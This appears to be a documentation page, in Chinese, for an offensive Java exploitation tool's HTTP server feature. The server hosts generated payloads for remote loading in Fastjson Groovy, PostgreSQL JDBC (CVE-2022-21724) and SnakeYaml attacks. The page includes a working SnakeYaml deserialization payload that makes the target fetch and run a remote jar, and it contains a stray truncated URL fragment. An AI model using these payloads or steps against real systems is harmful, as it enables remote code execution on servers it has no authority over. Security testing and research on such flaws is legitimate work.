---
sidebar_position: 6
---

# HTTP Server

一个简单的HTTP Server，可以将生成的 Payload 挂载到HTTP端口上，方便某些 HTTP URL 的反连场景。

## Fastjson Groovy 远程加载

Gadget名：`GroovyJarConvert`

使用 HTTP Server 并开启对应 HTTP 端口，选择 OtherPayload
在级联选择器中勾选 GroovyJarConvert，此 Gadget 会将字节码处理为 Groovy Jar Payload 格式，也就是Jar包，然后通过 HTTP Server
挂在到一个 HTTP 端口上，点击生成后会生成一个 HTTP 链接，放到 fastjson groovy payload 中即可使用

![](@site/static/doc/fastjson-groovy.png)

## PostgreSQL JDBC 的利用

可选的 Gadget：

- `SpringBeanXmlClassLoader`
- `SpringBeanXmlExec`
- `SpringBeanXmlSpEL`

PostgreSQL (CVE-2022-21724) 配合 SpringBean 远程加载XML文件，执行字节码并回显

![](@site/static/doc/postgresql-jdbc.png)

![](@site/static/doc/postgresql-jdbc2.png)
om/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

## SnakeYaml Jar 远程加载

Gadget 名：`SnakeyamlJarConvert`

生成过程与上面类似，不再过多阐述

通常配合如下 SnakeYaml Payload，实现远程加载 RCE

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [ [
    !!java.net.URL [ "http://127.0.0.1:7777/yaml-payload.jar" ]
  ] ]
]
```

参考：

- https://tttang.com/archive/1815/#toc_snakeyaml_1
- https://github.com/artsploit/yaml-payload